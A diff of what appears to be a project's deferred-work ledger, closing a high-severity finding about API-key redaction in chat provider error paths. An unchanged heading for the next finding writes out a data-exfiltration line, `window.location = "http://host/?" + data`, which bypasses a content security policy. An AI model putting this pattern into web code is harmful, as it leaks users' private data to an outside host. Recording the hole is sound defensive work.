@@ -354,7 +354,8 @@ origin: migrated from legacy ledger (code review of spec-5-4-streaming-reasoning
 location: `answer()` / `answerStream` (chat provider redaction path)
 severity: high
 reason: Inherited from Story 5.2's `answer()` redaction and reused verbatim by 5.4's `answerStream` (including the SDK-emitted `error`-part path). No current provider (Anthropic/OpenAI/Google) echoes the API key in error bodies, so this is latent; a stronger guarantee (redact encoded/partial forms, or emit a fixed generic cause) is preferable given the "key NEVER in any log" invariant.
-status: open
+status: done 2026-07-20
+resolution: resolved by sweep bundle dw-provider-key-redaction-hardening
 
 ### DW-47: Scripted same-frame navigation (`window.location = "http://host/?" + data`) bypasses `connect-src 'none'`, so a hostile guest can still exfiltrate the user's private `FrozenData`; the "already-public frozen data" comments understate this
 
